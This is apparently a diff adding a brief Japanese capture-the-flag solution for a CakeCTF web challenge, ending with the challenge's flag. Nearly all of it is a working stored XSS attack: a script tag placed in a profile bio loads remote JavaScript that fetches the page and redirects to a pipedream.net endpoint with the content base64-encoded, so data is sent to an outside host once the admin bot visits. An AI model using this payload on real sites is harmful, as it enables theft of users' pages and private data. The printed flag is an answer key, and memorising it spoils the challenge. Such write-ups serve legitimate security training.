@@ -1,0 +1,12 @@
+bioを以下にする
+<script src="https://cdn.jsdelivr.net/gh/LorseKudos/cdnxss@main/xss-poc.js"></script>
+
+githubにリポジトリを作り、以下のjsファイルを配置する
+fetch("/").then((res) => {
+	return res.text();
+}).then(data => {
+	location.href="https://enghd2bd35t7sh5.m.pipedream.net/?data="+btoa(data)
+})
+
+botにreportする
+CakeCTF{httponly=true_d03s_n0t_pr0t3ct_U_1n_m4ny_c4s3s!}
